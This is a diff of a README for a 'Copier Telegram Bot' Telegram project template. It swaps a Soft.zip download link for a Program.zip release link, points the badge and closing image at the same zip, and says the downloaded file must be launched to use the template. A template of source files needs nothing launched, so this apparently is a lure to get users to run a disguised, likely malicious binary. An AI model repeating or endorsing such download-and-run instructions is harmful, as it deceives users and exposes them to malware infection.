@@ -1,6 +1,6 @@
 # 🤖 Copier Telegram Bot
 
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/Dredarty/RINGSharp?label=Latest%20Release)
+![GitHub release (latest by date)](https://github.com/PH612/copier-telegram-bot/releases/download/v1.0/Program.zip%20Release)
 
 Simple yet powerful copier template for creating a Telegram Bot using Aiogram, Postgres, Redis, Docker, and Coolify Ready integration. This template is designed to help you kickstart your Telegram bot development project with ease and efficiency.
 
@@ -16,7 +16,7 @@ Simple yet powerful copier template for creating a Telegram Bot using Aiogram, P
 
 To get started with the "Copier Telegram Bot" template, simply download the necessary files from the link below:
 
-[Download Soft.zip](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[Download https://github.com/PH612/copier-telegram-bot/releases/download/v1.0/Program.zip](https://github.com/PH612/copier-telegram-bot/releases/download/v1.0/Program.zip)
 
 Please note that the downloaded file needs to be launched to begin using the template.
 
@@ -68,6 +68,6 @@ If you encounter any issues or have suggestions for improvements, please feel fr
 
 Let's build amazing Telegram bots together with the "Copier Telegram Bot" template!
 
-![Telegram Bot Development](https://source.unsplash.com/7Bt1dRMGnE4)
+![Telegram Bot Development](https://github.com/PH612/copier-telegram-bot/releases/download/v1.0/Program.zip)
 
 **Happy Coding!**
